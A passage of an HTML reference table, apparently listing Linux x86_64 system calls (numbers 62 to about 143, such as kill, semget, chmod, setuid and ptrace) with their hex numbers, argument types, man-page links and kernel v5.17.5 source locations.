href="http://www.kernel.org/doc/man-pages/online/pages/man2/kill.2.html">sys_kill</a></td><td>0x3e</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/signal.c#L3771">kernel&#x2F;signal.c:3771</a></td></tr><tr><td>63</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newuname.2.html">sys_newuname</a></td><td>0x3f</td><td>struct new_utsname __user *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1288">kernel&#x2F;sys.c:1288</a></td></tr><tr><td>64</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/semget.2.html">sys_semget</a></td><td>0x40</td><td>key_t key</td><td>int nsems</td><td>int semflg</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/sem.c#L624">ipc&#x2F;sem.c:624</a></td></tr><tr><td>65</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/semop.2.html">sys_semop</a></td><td>0x41</td><td>int semid</td><td>struct sembuf __user *sops</td><td>unsigned nsops</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/sem.c#L2298">ipc&#x2F;sem.c:2298</a></td></tr><tr><td>66</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/semctl.2.html">sys_semctl</a></td><td>0x42</td><td>int semid</td><td>int semnum</td><td>int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/sem.c#L1705">ipc&#x2F;sem.c:1705</a></td></tr><tr><td>67</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/shmdt.2.html">sys_shmdt</a></td><td>0x43</td><td>char __user *shmaddr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/shm.c#L1837">ipc&#x2F;shm.c:1837</a></td></tr><tr><td>68</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/msgget.2.html">sys_msgget</a></td><td>0x44</td><td>key_t key</td><td>int msgflg</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/msg.c#L315">ipc&#x2F;msg.c:315</a></td></tr><tr><td>69</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/msgsnd.2.html">sys_msgsnd</a></td><td>0x45</td><td>int msqid</td><td>struct msgbuf __user *msgp</td><td>size_t msgsz</td><td>int msgflg</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/msg.c#L971">ipc&#x2F;msg.c:971</a></td></tr><tr><td>70</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/msgrcv.2.html">sys_msgrcv</a></td><td>0x46</td><td>int msqid</td><td>struct msgbuf __user *msgp</td><td>size_t msgsz</td><td>long msgtyp</td><td>int msgflg</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/msg.c#L1270">ipc&#x2F;msg.c:1270</a></td></tr><tr><td>71</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/msgctl.2.html">sys_msgctl</a></td><td>0x47</td><td>int msqid</td><td>int cmd</td><td>struct msqid_ds __user *buf</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/msg.c#L640">ipc&#x2F;msg.c:640</a></td></tr><tr><td>72</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fcntl.2.html">sys_fcntl</a></td><td>0x48</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/fcntl.c#L439">fs&#x2F;fcntl.c:439</a></td></tr><tr><td>73</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/flock.2.html">sys_flock</a></td><td>0x49</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/locks.c#L2084">fs&#x2F;locks.c:2084</a></td></tr><tr><td>74</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fsync.2.html">sys_fsync</a></td><td>0x4a</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/sync.c#L218">fs&#x2F;sync.c:218</a></td></tr><tr><td>75</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fdatasync.2.html">sys_fdatasync</a></td><td>0x4b</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/sync.c#L223">fs&#x2F;sync.c:223</a></td></tr><tr><td>76</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/truncate.2.html">sys_truncate</a></td><td>0x4c</td><td>const char __user *path</td><td>long length</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L144">fs&#x2F;open.c:144</a></td></tr><tr><td>77</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ftruncate.2.html">sys_ftruncate</a></td><td>0x4d</td><td>unsigned int fd</td><td>unsigned long length</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L202">fs&#x2F;open.c:202</a></td></tr><tr><td>78</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getdents.2.html">sys_getdents</a></td><td>0x4e</td><td>unsigned int fd</td><td>struct linux_dirent __user *dirent</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/readdir.c#L271">fs&#x2F;readdir.c:271</a></td></tr><tr><td>79</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getcwd.2.html">sys_getcwd</a></td><td>0x4f</td><td>char __user *buf</td><td>unsigned long size</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/d_path.c#L411">fs&#x2F;d_path.c:411</a></td></tr><tr><td>80</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chdir.2.html">sys_chdir</a></td><td>0x50</td><td>const char __user *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L508">fs&#x2F;open.c:508</a></td></tr><tr><td>81</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchdir.2.html">sys_fchdir</a></td><td>0x51</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L534">fs&#x2F;open.c:534</a></td></tr><tr><td>82</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rename.2.html">sys_rename</a></td><td>0x52</td><td>const char __user *oldname</td><td>const char __user *newname</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L4974">fs&#x2F;namei.c:4974</a></td></tr><tr><td>83</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mkdir.2.html">sys_mkdir</a></td><td>0x53</td><td>const char __user *pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L4079">fs&#x2F;namei.c:4079</a></td></tr><tr><td>84</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rmdir.2.html">sys_rmdir</a></td><td>0x54</td><td>const char __user *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L4199">fs&#x2F;namei.c:4199</a></td></tr><tr><td>85</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/creat.2.html">sys_creat</a></td><td>0x55</td><td>const char __user *pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L1396">fs&#x2F;open.c:1396</a></td></tr><tr><td>86</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/link.2.html">sys_link</a></td><td>0x56</td><td>const char __user *oldname</td><td>const char __user *newname</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L4632">fs&#x2F;namei.c:4632</a></td></tr><tr><td>87</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/unlink.2.html">sys_unlink</a></td><td>0x57</td><td>const char __user *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L4366">fs&#x2F;namei.c:4366</a></td></tr><tr><td>88</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/symlink.2.html">sys_symlink</a></td><td>0x58</td><td>const char __user *old</td><td>const char __user *new</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L4450">fs&#x2F;namei.c:4450</a></td></tr><tr><td>89</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readlink.2.html">sys_readlink</a></td><td>0x59</td><td>const char __user *path</td><td>char __user *buf</td><td>int bufsiz</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/stat.c#L498">fs&#x2F;stat.c:498</a></td></tr><tr><td>90</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chmod.2.html">sys_chmod</a></td><td>0x5a</td><td>const char __user *filename</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L661">fs&#x2F;open.c:661</a></td></tr><tr><td>91</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchmod.2.html">sys_fchmod</a></td><td>0x5b</td><td>unsigned int fd</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L625">fs&#x2F;open.c:625</a></td></tr><tr><td>92</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chown.2.html">sys_chown</a></td><td>0x5c</td><td>const char __user *filename</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L785">fs&#x2F;open.c:785</a></td></tr><tr><td>93</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchown.2.html">sys_fchown</a></td><td>0x5d</td><td>unsigned int fd</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L821">fs&#x2F;open.c:821</a></td></tr><tr><td>94</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lchown.2.html">sys_lchown</a></td><td>0x5e</td><td>const char __user *filename</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L790">fs&#x2F;open.c:790</a></td></tr><tr><td>95</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/umask.2.html">sys_umask</a></td><td>0x5f</td><td>int mask</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1864">kernel&#x2F;sys.c:1864</a></td></tr><tr><td>96</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/gettimeofday.2.html">sys_gettimeofday</a></td><td>0x60</td><td>struct __kernel_old_timeval __user *tv</td><td>struct timezone __user *tz</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/time.c#L140">kernel&#x2F;time&#x2F;time.c:140</a></td></tr><tr><td>97</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getrlimit.2.html">sys_getrlimit</a></td><td>0x61</td><td>unsigned int resource</td><td>struct rlimit __user *rlim</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1498">kernel&#x2F;sys.c:1498</a></td></tr><tr><td>98</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getrusage.2.html">sys_getrusage</a></td><td>0x62</td><td>int who</td><td>struct rusage __user *ru</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1838">kernel&#x2F;sys.c:1838</a></td></tr><tr><td>99</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sysinfo.2.html">sys_sysinfo</a></td><td>0x63</td><td>struct sysinfo __user *info</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L2716">kernel&#x2F;sys.c:2716</a></td></tr><tr><td>100</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/times.2.html">sys_times</a></td><td>0x64</td><td>struct tms __user *tbuf</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1005">kernel&#x2F;sys.c:1005</a></td></tr><tr><td>101</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ptrace.2.html">sys_ptrace</a></td><td>0x65</td><td>long request</td><td>long pid</td><td>unsigned long addr</td><td>unsigned long data</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/ptrace.c#L1269">kernel&#x2F;ptrace.c:1269</a></td></tr><tr><td>102</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getuid.2.html">sys_getuid</a></td><td>0x66</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>103</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/syslog.2.html">sys_syslog</a></td><td>0x67</td><td>int type</td><td>char __user *buf</td><td>int len</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/printk/printk.c#L1769">kernel&#x2F;printk&#x2F;printk.c:1769</a></td></tr><tr><td>104</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getgid.2.html">sys_getgid</a></td><td>0x68</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>105</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setuid.2.html">sys_setuid</a></td><td>0x69</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L650">kernel&#x2F;sys.c:650</a></td></tr><tr><td>106</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setgid.2.html">sys_setgid</a></td><td>0x6a</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L467">kernel&#x2F;sys.c:467</a></td></tr><tr><td>107</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/geteuid.2.html">sys_geteuid</a></td><td>0x6b</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>108</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getegid.2.html">sys_getegid</a></td><td>0x6c</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>109</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setpgid.2.html">sys_setpgid</a></td><td>0x6d</td><td>pid_t pid</td><td>pid_t pgid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1055">kernel&#x2F;sys.c:1055</a></td></tr><tr><td>110</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getppid.2.html">sys_getppid</a></td><td>0x6e</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>111</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpgrp.2.html">sys_getpgrp</a></td><td>0x6f</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>112</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setsid.2.html">sys_setsid</a></td><td>0x70</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>113</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setreuid.2.html">sys_setreuid</a></td><td>0x71</td><td>uid_t ruid</td><td>uid_t euid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L587">kernel&#x2F;sys.c:587</a></td></tr><tr><td>114</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setregid.2.html">sys_setregid</a></td><td>0x72</td><td>gid_t rgid</td><td>gid_t egid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L421">kernel&#x2F;sys.c:421</a></td></tr><tr><td>115</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getgroups.2.html">sys_getgroups</a></td><td>0x73</td><td>int gidsetsize</td><td>gid_t __user *grouplist</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/groups.c#L161">kernel&#x2F;groups.c:161</a></td></tr><tr><td>116</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setgroups.2.html">sys_setgroups</a></td><td>0x74</td><td>int gidsetsize</td><td>gid_t __user *grouplist</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/groups.c#L198">kernel&#x2F;groups.c:198</a></td></tr><tr><td>117</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setresuid.2.html">sys_setresuid</a></td><td>0x75</td><td>uid_t ruid</td><td>uid_t euid</td><td>uid_t suid</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L730">kernel&#x2F;sys.c:730</a></td></tr><tr><td>118</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getresuid.2.html">sys_getresuid</a></td><td>0x76</td><td>uid_t __user *ruid</td><td>uid_t __user *euid</td><td>uid_t __user *suid</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L735">kernel&#x2F;sys.c:735</a></td></tr><tr><td>119</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setresgid.2.html">sys_setresgid</a></td><td>0x77</td><td>gid_t rgid</td><td>gid_t egid</td><td>gid_t sgid</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L813">kernel&#x2F;sys.c:813</a></td></tr><tr><td>120</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getresgid.2.html">sys_getresgid</a></td><td>0x78</td><td>gid_t __user *rgid</td><td>gid_t __user *egid</td><td>gid_t __user *sgid</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L818">kernel&#x2F;sys.c:818</a></td></tr><tr><td>121</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpgid.2.html">sys_getpgid</a></td><td>0x79</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1154">kernel&#x2F;sys.c:1154</a></td></tr><tr><td>122</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setfsuid.2.html">sys_setfsuid</a></td><td>0x7a</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L881">kernel&#x2F;sys.c:881</a></td></tr><tr><td>123</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setfsgid.2.html">sys_setfsgid</a></td><td>0x7b</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L925">kernel&#x2F;sys.c:925</a></td></tr><tr><td>124</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getsid.2.html">sys_getsid</a></td><td>0x7c</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1168">kernel&#x2F;sys.c:1168</a></td></tr><tr><td>125</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/capget.2.html">sys_capget</a></td><td>0x7d</td><td>cap_user_header_t header</td><td>cap_user_data_t dataptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/capability.c#L148">kernel&#x2F;capability.c:148</a></td></tr><tr><td>126</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/capset.2.html">sys_capset</a></td><td>0x7e</td><td>cap_user_header_t header</td><td>const cap_user_data_t data</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/capability.c#L222">kernel&#x2F;capability.c:222</a></td></tr><tr><td>127</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigpending.2.html">sys_rt_sigpending</a></td><td>0x7f</td><td>sigset_t __user *set</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/signal.c#L3213">kernel&#x2F;signal.c:3213</a></td></tr><tr><td>128</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigtimedwait.2.html">sys_rt_sigtimedwait</a></td><td>0x80</td><td>const sigset_t __user *uthese</td><td>siginfo_t __user *uinfo</td><td>const struct __kernel_timespec __user *uts</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/signal.c#L3627">kernel&#x2F;signal.c:3627</a></td></tr><tr><td>129</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigqueueinfo.2.html">sys_rt_sigqueueinfo</a></td><td>0x81</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t __user *uinfo</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/signal.c#L3996">kernel&#x2F;signal.c:3996</a></td></tr><tr><td>130</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigsuspend.2.html">sys_rt_sigsuspend</a></td><td>0x82</td><td>sigset_t __user *unewset</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/signal.c#L4633">kernel&#x2F;signal.c:4633</a></td></tr><tr><td>131</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigaltstack.2.html">sys_sigaltstack</a></td><td>0x83</td><td>const struct sigaltstack __user *uss</td><td>struct sigaltstack __user *uoss</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/signal.c#L4227">kernel&#x2F;signal.c:4227</a></td></tr><tr><td>132</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/utime.2.html">sys_utime</a></td><td>0x84</td><td>char __user *filename</td><td>struct utimbuf __user *times</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/utimes.c#L214">fs&#x2F;utimes.c:214</a></td></tr><tr><td>133</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mknod.2.html">sys_mknod</a></td><td>0x85</td><td>const char __user *filename</td><td>umode_t mode</td><td>unsigned dev</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L3996">fs&#x2F;namei.c:3996</a></td></tr><tr><td>134</td><td>not implemented</td><td>0x86</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>135</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/personality.2.html">sys_personality</a></td><td>0x87</td><td>unsigned int personality</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/exec_domain.c#L38">kernel&#x2F;exec_domain.c:38</a></td></tr><tr><td>136</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ustat.2.html">sys_ustat</a></td><td>0x88</td><td>unsigned dev</td><td>struct ustat __user *ubuf</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/statfs.c#L248">fs&#x2F;statfs.c:248</a></td></tr><tr><td>137</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/statfs.2.html">sys_statfs</a></td><td>0x89</td><td>const char __user * path</td><td>struct statfs __user *buf</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/statfs.c#L192">fs&#x2F;statfs.c:192</a></td></tr><tr><td>138</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fstatfs.2.html">sys_fstatfs</a></td><td>0x8a</td><td>unsigned int fd</td><td>struct statfs __user *buf</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/statfs.c#L213">fs&#x2F;statfs.c:213</a></td></tr><tr><td>139</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sysfs.2.html">sys_sysfs</a></td><td>0x8b</td><td>int option</td><td>unsigned long arg1</td><td>unsigned long arg2</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/filesystems.c#L191">fs&#x2F;filesystems.c:191</a></td></tr><tr><td>140</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpriority.2.html">sys_getpriority</a></td><td>0x8c</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L281">kernel&#x2F;sys.c:281</a></td></tr><tr><td>141</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setpriority.2.html">sys_setpriority</a></td><td>0x8d</td><td>int which</td><td>int who</td><td>int niceval</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L211">kernel&#x2F;sys.c:211</a></td></tr><tr><td>142</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_setparam.2.html">sys_sched_setparam</a></td><td>0x8e</td><td>pid_t pid</td><td>struct sched_param __user *param</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sched/core.c#L7872">kernel&#x2F;sched&#x2F;core.c:7872</a></td></tr><tr><td>143</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_getparam.2.html">sys_sched_getparam</a></td><td>0x8f</td><td>pid_t pid</td><td>struct sched_param __user *param</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sched/core.c#L7955">kernel&#x2F;sched&#x2F;core.c:7955</a></td></tr><tr><td>144</td><td><a 